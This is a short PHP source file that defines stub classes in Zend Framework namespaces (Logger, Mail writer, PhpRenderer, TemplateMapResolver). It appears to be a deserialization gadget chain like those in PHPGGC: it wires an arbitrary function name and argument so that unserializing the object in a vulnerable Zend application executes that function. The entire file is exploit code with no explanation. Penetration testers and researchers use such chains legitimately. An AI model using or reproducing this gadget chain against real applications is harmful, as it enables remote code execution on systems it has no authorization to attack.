<?php
namespace Zend\Log {
    class Logger
    {
        protected $writers;

        function __construct($func, $param)
        {
            $this->writers = [new \Zend\Log\Writer\Mail($func, $param)];
        }
    }
}

namespace Zend\Log\Writer {
    class Mail {
        protected $mail;
        protected $eventsToMail;
        protected $subjectPrependText;

        function __construct($func, $param)
        {
            $this->mail = new \Zend\View\Renderer\PhpRenderer($func);
            $this->eventsToMail = [$param];
            $this->subjectPrependText = null;
        }
        
    }
}

namespace Zend\View\Renderer {
    class PhpRenderer {
        private $__helpers;

        function __construct($func)
        {
            $this->__helpers = new \Zend\View\Resolver\TemplateMapResolver($func);
        }
    }
}

namespace Zend\View\Resolver {
    class TemplateMapResolver {
        protected $map;

        function __construct($func)
        {
            $this->map = [
                "setBody" => $func,
            ];
        }
    }
}